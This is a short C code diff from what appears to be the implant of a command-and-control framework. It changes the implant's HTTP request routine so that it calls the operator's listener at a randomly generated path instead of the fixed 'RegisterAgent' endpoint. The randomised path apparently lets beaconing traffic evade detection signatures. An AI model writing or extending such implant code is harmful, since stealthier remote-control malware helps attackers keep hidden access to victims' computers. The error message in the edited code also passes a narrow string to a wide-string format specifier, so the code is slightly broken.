@@ -22,9 +22,7 @@ INT PerformRequest(pAgent agent, BYTE* Buffer, SIZE_T BufferLength) {
 	HTTP_FLAGS = WINHTTP_FLAG_BYPASS_PROXY_CACHE; 
 	HTTP_FLAGS |= WINHTTP_FLAG_SECURE;
 
-	//TODO WRITE LOGIC TO REPLACE THE ENDPOINT WITH RANDOMLY GENERATED STRINGS
-	// THEN WRITE SERVER LOGIC TO PARSE PAYLOAD TO OBTAIN REQUEST TYPE.
-	if (!(hRequest = agent->pWinHttpOpenRequest(hConnect, agent->config->listenerConfig.Method, L"RegisterAgent", NULL, NULL, NULL, HTTP_FLAGS))) {
+	if (!(hRequest = agent->pWinHttpOpenRequest(hConnect, agent->config->listenerConfig.Method, generateRandomStringW(10), NULL, NULL, NULL, HTTP_FLAGS))) {
 		printf("[!] Failure to perform request to endpoint [%ls]. Err: [%08x]\n", "RegisterAgent", GetLastError());
 		return INVALID_HANDLE_VALUE;
 	}
